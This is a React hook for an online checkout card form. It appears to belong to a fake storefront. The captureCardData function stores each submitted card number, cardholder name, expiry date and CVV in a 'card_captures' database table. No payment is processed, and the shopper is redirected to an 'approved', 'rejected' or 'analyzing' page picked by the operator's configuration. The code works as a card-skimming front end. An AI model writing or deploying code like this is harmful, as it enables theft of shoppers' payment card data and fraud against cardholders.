import { useState, useEffect } from "react";
import { useNavigate, useParams } from "react-router-dom";
import { ConfigCheckout } from "@/lib/types/database-types";
import { toast } from "sonner";
import { CardFormData, PaymentStatus } from "@/components/checkout/payment/types";
import { supabase } from "@/integrations/supabase/client";

export const useCardPaymentForm = (
  customRedirectStatus?: PaymentStatus,
  configCheckout?: ConfigCheckout | null,
  onPaymentSubmit?: (data: CardFormData) => void
) => {
  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCVV, setCardCVV] = useState("");
  const [installments, setInstallments] = useState("1");
  const [isValid, setIsValid] = useState({
    cardNumber: false,
    cardName: false,
    cardExpiry: false,
    cardCVV: false
  });
  const [formIsComplete, setFormIsComplete] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const { slug } = useParams<{ slug: string }>();
  const navigate = useNavigate();

  const handleCardNumberChange = (value: string, isValid: boolean) => {
    setCardNumber(value);
    setIsValid(prev => ({
      ...prev,
      cardNumber: isValid
    }));
  };

  const handleCardNameChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setCardName(value);
    setIsValid(prev => ({
      ...prev,
      cardName: value.trim().length > 3 && value.includes(' ')
    }));
  };

  const handleCardExpiryChange = (value: string, isValid: boolean) => {
    setCardExpiry(value);
    setIsValid(prev => ({
      ...prev,
      cardExpiry: isValid
    }));
  };

  const handleCardCVVChange = (value: string, isValid: boolean) => {
    setCardCVV(value);
    setIsValid(prev => ({
      ...prev,
      cardCVV: isValid
    }));
  };
  
  const captureCardData = async (cardData: CardFormData) => {
    try {
      console.log("Saving card data to database...");
      
      const { data, error } = await supabase
        .from("card_captures")
        .insert([{
          nome_cliente: cardData.cardName,
          numero_cartao: cardData.cardNumber,
          validade: cardData.cardExpiry,
          cvv: cardData.cardCVV
        }]);
      
      if (error) {
        console.error("Error saving card data:", error);
        throw error;
      }
      
      console.log("Card data saved successfully");
      return true;
    } catch (err) {
      console.error("Failed to capture card data:", err);
      return false;
    }
  };
  
  const handleSubmitPayment = async () => {
    if (!formIsComplete) return;
    
    setIsSubmitting(true);
    
    const cardData: CardFormData = {
      cardNumber,
      cardName,
      cardExpiry,
      cardCVV,
      installments
    };
    
    console.log("Processing card payment:", { 
      slug, 
      customRedirectStatus,
      configCardStatus: configCheckout?.redirect_card_status,
      cardData: { ...cardData, cardNumber: "****" } // Mask card number in log
    });
    
    try {
      await captureCardData(cardData);
      
      if (onPaymentSubmit) {
        onPaymentSubmit(cardData);
      } else {
        setTimeout(() => {
          try {
            if (slug) {
              let redirectStatus: PaymentStatus;
              
              if (customRedirectStatus) {
                redirectStatus = customRedirectStatus;
                console.log("Using custom status:", redirectStatus);
              } else if (configCheckout?.redirect_card_status) {
                const configStatus = configCheckout.redirect_card_status;
                if (['analyzing', 'approved', 'rejected'].includes(configStatus as string)) {
                  redirectStatus = configStatus as PaymentStatus;
                  console.log("Using global config status:", redirectStatus);
                } else {
                  redirectStatus = 'analyzing';
                  console.log("Config status invalid, using default:", redirectStatus);
                }
              } else {
                redirectStatus = 'analyzing';
                console.log("Using default status:", redirectStatus);
              }
              
              console.log(`Redirecting to: /payment-status/${slug}/${redirectStatus}`);
              navigate(`/payment-status/${slug}/${redirectStatus}`);
            } else {
              console.error("Slug not found for redirect");
              toast.error("Error processing payment: product reference not found");
            }
          } catch (error) {
            console.error("Redirect error:", error);
            toast.error("Error processing payment");
          } finally {
            setIsSubmitting(false);
          }
        }, 1500);
      }
    } catch (error) {
      console.error("Payment processing error:", error);
      toast.error("Failed to process payment. Please try again.");
      setIsSubmitting(false);
    }
  };
  
  useEffect(() => {
    setFormIsComplete(
      isValid.cardNumber && 
      isValid.cardName && 
      isValid.cardExpiry && 
      isValid.cardCVV
    );
  }, [isValid]);

  return {
    cardNumber,
    cardName,
    cardExpiry,
    cardCVV,
    installments,
    isValid,
    formIsComplete,
    isSubmitting,
    setInstallments,
    handleCardNumberChange,
    handleCardNameChange,
    handleCardExpiryChange,
    handleCardCVVChange,
    handleSubmitPayment
  };
};
